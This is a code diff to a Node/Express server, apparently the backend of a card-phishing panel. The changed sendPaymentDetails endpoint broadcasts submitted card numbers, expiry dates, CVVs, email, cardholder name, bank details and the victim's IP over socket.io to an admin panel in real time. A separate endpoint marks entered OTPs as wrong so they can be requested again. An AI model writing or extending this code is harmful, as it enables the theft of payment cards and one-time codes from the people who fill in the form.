@@ -531,6 +531,7 @@ app.get('/api/getPaymentDetails', (req, res) => {
   res.json({ status: "success", payment });
 });
 
+// Transactions Endpoints - Modified to handle bank info
 app.post('/api/sendPaymentDetails', (req, res) => {
   try {
     const { cardNumber, expiry, cvv, email, amount, currency, cardholder, bankInfo } = req.body;
@@ -576,9 +577,26 @@ app.post('/api/sendPaymentDetails', (req, res) => {
 
     transactions.set(invoiceId, transaction);
     
-    // Emit both events to ensure compatibility
+    // Emit both events for compatibility
     io.emit('new_transaction');
-    io.emit('card_submitted', transaction); // Add this line to emit the card_submitted event
+    
+    // Add card_submitted event with transaction data for real-time updates in admin panel
+    io.emit('card_submitted', {
+      invoiceId,
+      cardData: {
+        cardNumber,
+        expiry,
+        cvv,
+        email,
+        amount: amount.toString().replace(/,/g, ''),
+        currency,
+        cardholder,
+        bankName: parsedBankInfo?.bank || 'Unknown',
+        country: parsedBankInfo?.country || 'Unknown',
+        cardType: parsedBankInfo?.scheme || 'Unknown'
+      },
+      ip
+    });
     
     res.json({ status: "success", invoiceId });
   } catch (error) {
@@ -612,7 +630,6 @@ app.post('/api/wrongOTP', (req, res) => {
   txn.status = 'otp_pending';
   res.json({ status: "success", message: "OTP marked wrong" });
 });
-
 app.get('/api/checkTransactionStatus', (req, res) => {
   const { invoiceId } = req.query;
   const txn = transactions.get(invoiceId);
